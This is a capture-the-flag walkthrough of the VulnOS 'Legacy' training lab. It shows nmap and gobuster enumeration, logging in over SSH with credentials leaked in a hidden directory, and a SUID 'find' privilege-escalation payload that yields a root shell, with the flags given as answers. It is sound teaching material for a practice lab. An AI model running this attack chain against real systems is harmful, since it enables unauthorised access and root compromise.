# 🧠 VulnOS “Legacy” Lab Walkthrough 🗿

There’s a quiet revolution happening in the cyber lab world. While some platforms try to dazzle with complexity, others double down on solid foundational training. One such new kid on the block is **VulnOS**, and their first lab: **Legacy**: proves that sometimes, simple is strategic.

🧩 Difficulty: *Easy* <br/>
🕒 Est. Time: *\~45 minutes* <br/>
🔗 [Launch Lab](https://learn.vulnos.tech/lab/environment.html?id=60) <br/>

Let’s break it down chapter by chapter.

<img width="1631" height="828" alt="Cover" src="https://github.com/user-attachments/assets/c7165d02-6159-457d-97af-f0f8b266d216" /> <br/>

---

## 🔍 Chapter 1: Reconnaissance & Enumeration

> *“You can't pwn what you haven’t mapped.”*

The first prompt pushes us to do what any pentester should: **scan first, exploit later**. The goal? Identify all open TCP ports and determine the service/version running on the *highest* open port.

So we roll out:

```bash
nmap -sV -A -sC 10.0.128.13
```

Here’s what we uncover:

<img width="1239" height="742" alt="1" src="https://github.com/user-attachments/assets/65b70184-c829-4a4d-9da6-0cefcb05bd98" /> <br/>

```
22/tcp   -> SSH (OpenSSH 8.9p1)
80/tcp   -> HTTP (Apache 2.4.52)
8000/tcp -> HTTP (Apache 2.4.52)
```

The **highest open port** is `8000` → running Apache `2.4.52`.

This lines up with the hint in the lab’s instructions:

> *“Identify the service version on the highest port.”*
> → That’s what led us to submit:

📍 **Flag**:

```
flag{Apache httpd 2.4.52}
```

---

## 🕸️ Chapter 2: Gaining a Foothold

> *“Enumeration isn't optional: it's survival.”*

Next, we’re told to **enumerate the web server on port 80** and search for **hidden files or directories**.

When a lab nudges you like that, it’s practically yelling:

> *“Hey, run Gobuster already.”*

So we do:

```bash
gobuster dir -u http://10.0.128.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

Result:

<img width="1551" height="400" alt="2" src="https://github.com/user-attachments/assets/93a67b84-022a-4fac-a193-87e005fd5c69" /> <br/>

We strike gold with:

```
/.secret
```

Peeking inside:

<img width="572" height="216" alt="3" src="https://github.com/user-attachments/assets/75bef6b3-935f-43e2-9580-d7fcc1930807" /> <br/>

We find `credentials.txt` with:

```
Username: aditya  
Password: Cyber@123
```

This matched the objective perfectly: “find credentials for a user.”

📍 **Flag**:

```
flag{Cyber@123}
```

<img width="875" height="206" alt="4" src="https://github.com/user-attachments/assets/5ad26efa-cd16-440e-85e9-de7780e46437" /> <br/>

---

## 🧑‍💻 Chapter 3: User-Level Access

> *“Credentials without access is just trivia.”*

With the creds in hand, we try the obvious: **SSH**:

```bash
ssh aditya@10.0.128.13
```

Inputting `Cyber@123`, we’re in.

From there:

```bash
ls
cat user.txt
```

<img width="962" height="945" alt="5" src="https://github.com/user-attachments/assets/6cad5abe-411d-442b-8296-19ee020c38a4" /> <br/>

We find and capture the user flag.

📍 **Flag**:

```
flag{USER_FLAG_CAPTURED_WELL_DONE}
```

🗿 Pro tip: Always check the home directory first. The user flag’s hiding in plain sight.

---

## 🧨 Chapter 4: Privilege Escalation

> *“Root isn't a right, it's an earned privilege.”*

This is where most beginner-friendly labs get interesting.

We try:

```bash
sudo -l
```

<img width="915" height="354" alt="6" src="https://github.com/user-attachments/assets/dd223eaf-b1ed-4b52-b278-6a7795e24edf" /> <br/>

Denied. No sudo privileges.

Now what? The **instructions guide us clearly**:

> *“Find SUID binaries and exploit via GTFOBins.”*

I’ll be real: 10 hours of guessing won’t beat 10 minutes of reading. So I follow the hint and run:

```bash
find / -perm -4000 -type f 2>/dev/null
```

From the list, **`/usr/bin/find`** stands out.
We hop onto [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid), which confirms it’s exploitable via SUID:

<img width="1476" height="952" alt="7" src="https://github.com/user-attachments/assets/354c3508-1fa5-4e72-a936-5320b4a31cf9" /> <br/>

Payload:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Boom: root shell.

```bash
whoami
root
cat /root/root.txt
```

<img width="995" height="175" alt="8" src="https://github.com/user-attachments/assets/8bd25386-38d6-4e7b-90f0-ae93c878bbf1" /> <br/>

📍 **Flag**:

```
flag{LEGACY_SYSTEM_COMPROMISED_EXCELLENT_WORK}
```

---

## 🎯 Final Thoughts

**Legacy** is more than just an “easy” lab: it’s a reminder that **pentesting is about process**. Each chapter teaches something important:

✅ Use Nmap *intelligently* <br/>
✅ Trust enumeration tools, but trust your eyes more <br/>
✅ Credentials don’t always mean immediate victory: they’re only step one <br/>
✅ Privilege escalation isn’t magic: it’s methodical <br/>

> 🗿 “Read the hints. Use your brain. Google the weird stuff. That’s the way.”

This lab is perfect for learners aiming to **connect the dots** between basic tools and real-world thinking. Definitely worth a try: even if you're not chasing flags, you're building mindset.

---

## 🙌 That’s a Wrap!

If you found this walkthrough helpful, insightful, or even mildly entertaining 🗿:  consider showing some love:

🔗 **Follow me for more content on**:

* 🛡️ **Cybersecurity** deep dives
* 🧠 **CTF writeups** & real-world labs
* ⚙️ **Open-source tools** & scripts

📍 **LinkedIn**: [linkedin.com/in/aditya-bhatt3010](https://linkedin.com/in/aditya-bhatt3010) <br/>
📍 **Medium**: [medium.com/@adityabhatt3010](https://medium.com/@adityabhatt3010) <br/>
📍 **GitHub**: [github.com/AdityaBhatt3010](https://github.com/AdityaBhatt3010) <br/>

🚀 Also, if you haven’t yet, **check out VulnOS** and try the **Legacy Lab** for yourself: <br/>
🔗 [https://vulnos.tech](VulnOS.tech)

🗿 Until next time, <br/>
**Hack smart, stay curious, and always read the README.** <br/>
~ *Aditya Bhatt* <br/>

---
